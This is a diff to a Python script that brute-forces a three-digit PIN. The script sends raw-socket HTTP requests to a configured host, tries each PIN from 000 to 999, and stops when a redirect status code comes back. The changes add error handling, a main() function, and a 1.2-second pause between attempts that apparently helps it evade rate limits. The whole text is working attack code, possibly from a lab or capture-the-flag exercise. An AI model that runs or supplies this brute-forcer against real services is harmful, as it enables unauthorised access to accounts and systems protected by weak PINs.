@@ -16,34 +16,56 @@ def send_pin(pin):
         f"{body}"
     )
 
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.connect((HOST, PORT))
-        s.sendall(request.encode())
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+           
+            s.connect((HOST, PORT))
+            
+            s.sendall(request.encode())
 
-        response = b""
-        while True:
-            data = s.recv(4096)
-            if not data:
-                break
-            response += data
+            response = b""
+            while True:
+                data = s.recv(4096)  
+                if not data:
+                    break
+                response += data
 
-    return response.decode()
+        return response.decode('utf-8')
+
+    except socket.error as e:
+        print(f"Error with socket communication: {e}")
+        return None
 
 
-for pin_number in range(0, 1000):
-    pin = f"{pin_number:03d}"
-    print(f"\n🔎 Trying PIN: {pin}")
-    response = send_pin(pin)
+def main():
+    for pin_number in range(0, 1000):
+        pin = f"{pin_number:03d}"
+        print(f"\n🔎 Trying PIN: {pin}")
+        
+        
+        response = send_pin(pin)
 
-   
-    status_code = response.split()[1]
+        
+        if not response:
+            print(" No response from server.")
+            continue
 
-    print(f"📩 Status Code: {status_code}")
+       
+        try:
+            status_code = response.split()[1]
+        except IndexError:
+            print(" Unexpected response format.")
+            continue
 
-    
-    if status_code.startswith('3'):
-        print(f"\n✅ Correct PIN found: {pin}")
-        break
+        print(f"📩 Status Code: {status_code}")
 
-    
-    time.sleep(1.2)
+       
+        if status_code.startswith('3'):
+            print(f"\n✅ Correct PIN found: {pin}")
+            break
+
+        time.sleep(1.2)
+
+
+if __name__ == "__main__":
+    main()
